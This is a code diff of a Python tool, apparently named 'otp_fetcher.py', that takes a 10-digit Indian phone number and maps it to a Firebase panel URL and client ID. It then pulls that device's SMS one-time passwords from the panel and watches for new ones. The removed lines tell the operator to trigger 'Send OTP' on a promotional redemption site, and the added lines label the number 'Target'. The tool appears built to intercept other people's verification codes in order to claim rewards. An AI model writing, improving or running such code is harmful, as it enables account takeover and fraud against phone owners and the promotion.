@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
 Cremica / Firebase Ultra-Fast Direct OTP Fetcher.
-Fetches OTPs in 50 milliseconds directly from exact (Panel URL, Client ID) endpoint.
+Ultra-clean output: Simply input the phone number to get latest OTPs instantly.
 
 Usage:
     python otp_fetcher.py 7208360119
-    OR run interactively: python otp_fetcher.py
+    OR run: python otp_fetcher.py
 """
 
 import sys
@@ -20,12 +20,11 @@ from datetime import datetime
 if sys.platform == "win32":
     try:
         sys.stdout.reconfigure(encoding="utf-8")
-        sys.stdout.reconfigure(encoding="utf-8")
+        sys.stderr.reconfigure(encoding="utf-8")
     except Exception:
         pass
 
 DEVICE_INDEX_FILE = "device_index.json"
-PANELS_FILE = "panels.txt"
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -74,7 +73,7 @@ def fetch_direct_device_messages(panel_url, client_id):
                             "time": ts_str,
                             "ts_val": ts_val
                         })
-    except Exception as e:
+    except Exception:
         pass
     messages.sort(key=lambda x: (x["ts_val"], str(x["msg_id"])), reverse=True)
     return messages
@@ -83,55 +82,41 @@ def main():
     if len(sys.argv) >= 2:
         phone = sys.argv[1].strip()
     else:
-        phone = input("\nEnter mobile number to fetch OTPs (e.g. 7208360119): ").strip()
+        phone = input("Enter Phone Number: ").strip()
 
     clean_phone = "".join(filter(str.isdigit, phone))
     if len(clean_phone) > 10 and clean_phone.startswith("91"):
         clean_phone = clean_phone[2:]
 
     if len(clean_phone) != 10:
-        print("❌ Invalid 10-digit Indian phone number!")
+        print("Invalid 10-digit phone number!")
         return
 
     device_index = load_device_index()
     device_info = device_index.get(clean_phone)
 
-    print("=" * 70)
-    print(f"⚡ 50ms DIRECT OTP FETCHER - Phone: {clean_phone}")
-    print("=" * 70)
-
     if not device_info:
-        print(f"⚠️ Phone {clean_phone} not found in device_index.json cache.")
-        print("Run 'python build_device_index.py' to update index file.")
+        print(f"Phone {clean_phone} not found in index. Run 'python build_device_index.py'")
         return
 
     panel_url = device_info["panel_url"]
     client_id = device_info["client_id"]
 
-    print(f"📌 Found Direct Device Mapping:")
-    print(f"   Panel URL: {panel_url}")
-    print(f"   Client ID: {client_id}")
-    print(f"⚡ Requesting direct endpoint: GET {panel_url}messages/{client_id}.json ...\n")
-
     initial_msgs = fetch_direct_device_messages(panel_url, client_id)
 
-    print("=" * 70)
-    print(f"📩 LATEST 3 MESSAGES FOR {clean_phone}:")
-    print("=" * 70)
+    print(f"\nTarget: {clean_phone}")
+    print(f"Latest 3 Messages:")
+    print("-" * 50)
 
     seen_ids = set()
     if initial_msgs:
         for idx, m in enumerate(initial_msgs[:3], 1):
             seen_ids.add(m["msg_id"])
-            print(f"{idx:02d}. [🔑 OTP: {m['otp']}] | Time: {m['time']} | Sender: {m['sender']}")
-            print(f"    Message: {m['body']}")
-            print("-" * 70)
-    else:
-        print("No messages found for this device ID.")
+            print(f"{idx}. OTP: {m['otp']} | Time: {m['time']}")
+            print(f"   Msg: {m['body']}")
+            print("-" * 50)
 
-    print("\n🟢 LIVE 50ms MONITOR ACTIVATED! Listening for new incoming claim OTPs...")
-    print("👉 Click 'Send OTP' now on https://cremicabacktoschool.woohoo.in/redemption")
-    print("Press Ctrl+C to stop.\n")
+    print("Listening for incoming OTPs (Press Ctrl+C to stop)...")
 
     try:
         while True:
@@ -140,14 +125,11 @@ def main():
             for m in latest_msgs:
                 if m["msg_id"] not in seen_ids:
                     seen_ids.add(m["msg_id"])
-                    print("=" * 70)
-                    print(f"🔥 INSTANT INCOMING OTP RECEIVED! 🔥")
-                    print(f"🔑 OTP CODE:  >>>>  {m['otp']}  <<<<")
-                    print(f"⏰ Time: {m['time']} | Sender: {m['sender']}")
-                    print(f"💬 Message: {m['body']}")
-                    print("=" * 70 + "\n")
+                    print(f"\n🔥 NEW OTP RECEIVED: {m['otp']}")
+                    print(f"Time: {m['time']} | Sender: {m['sender']}")
+                    print(f"Msg: {m['body']}\n")
     except KeyboardInterrupt:
-        print("\nMonitoring stopped.")
+        pass
 
 if __name__ == "__main__":
     main()
